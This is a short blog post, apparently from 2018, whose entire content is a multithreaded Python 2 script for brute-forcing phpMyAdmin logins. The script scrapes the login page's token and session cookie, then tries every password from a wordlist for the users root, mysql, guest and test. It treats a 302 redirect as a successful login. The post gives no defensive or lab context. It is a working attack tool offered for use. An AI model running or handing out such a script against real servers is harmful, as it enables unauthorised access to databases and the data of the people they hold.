---
title: phpmyadmin 密码爆破脚本python 多线程
tags: []
id: '565'
categories:
  - - python
date: 2018-11-30 13:34:25
---

```
#!/usr/bin/env/python
# -*- coding: utf-8 -*-
import requests
import re
import HTMLParser
import threading

url = 'https://xxx.cn/phpMyAdmin/index.php'
count = 0
flag = 0
user_list = ['root','mysql','guest','test']
pwdfilename = 'risk2.txt'

def getpassword(user,password):
    ss=requests.session()
    r = ss.get(url)
    tmpsession = re.findall(r'phpMyAdmin=(.*?);', r.headers['Set-Cookie'])
    left = r.content.rfind('name="token" value="')
    tmp = r.content[left+20:]
    right = tmp.find('" /></fieldset>')
    token = tmp[:right]
    # print token
    http_parser = HTMLParser.HTMLParser();  
    token = http_parser.unescape(token);  
    post_data={"set_session":tmpsession[2],"pma_username":user,"pma_password":password,"server":"1","target":"index.php","token":token}
    r2 = ss.post(url,data=post_data,allow_redirects=False)
    # print post_data
    if r2.status_code == 302:
        print "Find PASSWORD!!!!!!:"+user+":"+password
        flag = 1
        exit()


for user in user_list:
    print "开始破解 "+user+"密码"
    for line in open(pwdfilename,'r'):
        password = line.strip()
        t = threading.Thread(target=getpassword, args=(user, password))
        t.start()
        # getpassword(user, password)
        count += 1
        # print count
if flag:
    print "破解结束"
else:
    print "破解结束:未成功破解"
```